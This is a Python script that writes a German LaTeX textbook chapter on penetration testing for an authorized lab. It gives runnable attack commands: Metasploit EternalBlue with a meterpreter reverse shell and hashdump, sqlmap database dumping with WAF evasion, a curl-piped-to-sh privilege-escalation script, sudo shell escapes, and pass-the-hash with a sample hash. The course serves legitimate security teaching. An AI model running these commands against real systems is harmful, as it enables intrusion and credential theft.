
# ============================================================
# KAPITEL 05 - Angriffe und Penetrationstesting
# ============================================================
cap05 = r"""
\chapter{Penetrationstesting und Angriffstechniken}

\section{Methodik und Vorgehen}

\begin{table}[H]
\centering
\caption{Penetrationstest-Phasen nach PTES}
\begin{tabular}{|c|l|p{7cm}|}
\hline
\rowcolor{primaryblue!20}
\textbf{Phase} & \textbf{Name} & \textbf{Beschreibung} \\
\hline
1 & Pre-Engagement & Scope, Ziele, Rechtliches klaeren \\
\hline
2 & Reconnaissance & Informationssammlung (passiv/aktiv) \\
\hline
3 & Scanning & Ports, Dienste, Schwachstellen scannen \\
\hline
4 & Exploitation & Schwachstellen ausnutzen \\
\hline
5 & Post-Exploitation & Privilege Escalation, Lateral Movement \\
\hline
6 & Reporting & Dokumentation und Empfehlungen \\
\hline
\end{tabular}
\end{table}

\section{Reconnaissance -- Informationssammlung}

\subsection{Passiv -- OSINT}

\begin{lstlisting}[language=bash, caption=OSINT Tools]
# theHarvester -- E-Mails und Subdomains
theHarvester -d lab.local -b all -l 500

# Shodan CLI
shodan search "hostname:lab.local"
shodan host 10.0.10.5

# Maltego (GUI)
# Starten: maltego
# Transform: DNS to IP, IP to Ports

# Recon-ng
recon-ng
> marketplace install all
> modules load recon/domains-hosts/bing_domain_web
> options set SOURCE lab.local
> run
\end{lstlisting}

\subsection{Aktiv -- Nmap Scanning}

\begin{lstlisting}[language=bash, caption=Nmap Scanning Techniken]
# Basis-Scan
nmap -sV -sC -O 10.0.30.0/24

# Vollstaendiger Scan
nmap -sV -sC -p- -T4 --open 10.0.30.10 -oA scan_results

# Schwachstellen-Scan
nmap --script vuln 10.0.30.10

# Stealth-Scan (SYN)
nmap -sS -T2 -f 10.0.30.10

# NSE Scripts
nmap --script smb-vuln-ms17-010 10.0.30.10
nmap --script http-sql-injection 10.0.30.15
nmap --script ssl-heartbleed 10.0.30.20
\end{lstlisting}

\section{Exploitation -- Metasploit Framework}

\begin{lstlisting}[language=bash, caption=Metasploit Grundlagen]
# Metasploit starten
msfconsole -q

# Datenbank initialisieren
msfdb init
db_status

# Nmap-Scan in Metasploit
db_nmap -sV -sC 10.0.30.0/24
hosts
services

# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.30.10
set LHOST 10.0.40.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Meterpreter-Session
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > run post/multi/recon/local_exploit_suggester
\end{lstlisting}

\section{Web-Anwendungsangriffe}

\subsection{SQL Injection mit SQLmap}

\begin{lstlisting}[language=bash, caption=SQLmap Angriffe]
# Basis-Test
sqlmap -u "http://10.0.10.5/login.php?id=1" --dbs

# Mit Cookie-Authentifizierung
sqlmap -u "http://10.0.10.5/app.php?id=1" \
  --cookie="PHPSESSID=abc123; security=low" \
  --dbs --tables --dump

# POST-Request
sqlmap -u "http://10.0.10.5/login.php" \
  --data="username=admin&password=test" \
  --level=5 --risk=3

# WAF umgehen
sqlmap -u "http://10.0.10.5/?id=1" \
  --tamper=space2comment,between,randomcase
\end{lstlisting}

\subsection{XSS und CSRF}

\begin{lstlisting}[language=bash, caption=XSS Tests mit XSStrike]
# XSStrike installieren
git clone https://github.com/s0md3v/XSStrike
cd XSStrike && pip3 install -r requirements.txt

# XSS-Scan
python3 xsstrike.py -u "http://10.0.10.5/search.php?q=test"

# DOM-basiertes XSS
python3 xsstrike.py -u "http://10.0.10.5/app.php" \
  --data "input=test" --dom

# Burp Suite Proxy
# Browser: Proxy 127.0.0.1:8080
# Intercept -> Modify -> Repeater
\end{lstlisting}

\section{Privilege Escalation}

\subsection{Linux Privilege Escalation}

\begin{lstlisting}[language=bash, caption=Linux PrivEsc Techniken]
# LinPEAS ausfuehren
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/\
  download/linpeas.sh | sh

# SUID-Binaries finden
find / -perm -u=s -type f 2>/dev/null

# Sudo-Rechte pruefen
sudo -l

# Cron-Jobs analysieren
cat /etc/crontab
ls -la /etc/cron.*

# Kernel-Exploit suchen
uname -a
searchsploit linux kernel 5.15

# GTFOBins -- Sudo-Escape
# https://gtfobins.github.io/
sudo vim -c ':!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
\end{lstlisting}

\subsection{Windows Privilege Escalation}

\begin{lstlisting}[language=powershell, caption=Windows PrivEsc mit PowerUp]
# PowerUp laden
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# WinPEAS ausfuehren
.\winPEASx64.exe

# Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | `
  findstr /i "auto" | findstr /i /v "c:\windows\\"

# AlwaysInstallElevated pruefen
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Token Impersonation (PrintSpoofer)
.\PrintSpoofer64.exe -i -c cmd
\end{lstlisting}

\section{Lateral Movement}

\begin{lstlisting}[language=bash, caption=Lateral Movement Techniken]
# Pass-the-Hash mit CrackMapExec
crackmapexec smb 10.0.30.0/24 \
  -u Administrator \
  -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# PsExec via Metasploit
use exploit/windows/smb/psexec
set RHOSTS 10.0.30.10
set SMBUser Administrator
set SMBPass Password123!
run

# BloodHound -- AD-Angriffspfade
# SharpHound Collector
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# BloodHound starten
neo4j start
bloodhound &
# Daten importieren -> Angriffspfade analysieren
\end{lstlisting}

\begin{warningbox}
  \textbf{Rechtlicher Hinweis:} Alle Angriffstechniken duerfen NUR in der 
  autorisierten Laborumgebung angewendet werden. Jeder unerlaubte Angriff 
  auf fremde Systeme ist strafbar (\S{}202a StGB)!
\end{warningbox}
"""

with open(f"{chapters_dir}/05_angriffe.tex", "w", encoding="utf-8") as f:
    f.write(cap05)
print("✅ 05_angriffe.tex")
